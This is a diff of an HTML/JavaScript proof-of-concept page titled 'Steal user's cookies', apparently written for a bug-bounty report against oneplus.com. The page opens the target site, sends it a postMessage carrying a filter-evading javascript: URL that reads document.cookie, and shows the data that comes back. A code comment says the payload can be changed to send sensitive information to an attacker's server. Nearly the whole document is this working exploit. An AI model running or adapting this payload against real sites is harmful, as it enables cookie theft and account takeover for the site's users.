@@ -9,7 +9,6 @@ Steal user's cookies
 <button id="stealaccount">Show customers's cookies with pop-windows</button>
 <script>
 var victim = document.getElementById('sendmessage').contentWindow;
-var h1Win;
 window.addEventListener('message', function(e) {
         console.log('Get data from oneplus ---> ' + e.data);
 	document.getElementById('cookie').innerHTML = e.data;
@@ -24,13 +23,13 @@ setTimeout(function(){
 	
 	//Other ways only pop the window for show cookies
 function openWin(){
-	h1Win = window.open("https://www.oneplus.com/cn");
+	window.h1Win = window.open("https://www.oneplus.com/cn");
 	}
 
 function sendMessage(){
 	var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
 	//you can change the url payload for send back some sensitive information to the attacker's server
-	h1Win.postMessage(data,"*");
+	window.h1Win.postMessage(data,"*");
 	}
 	
 document.getElementById("openH1").addEventListener('click', openWin);
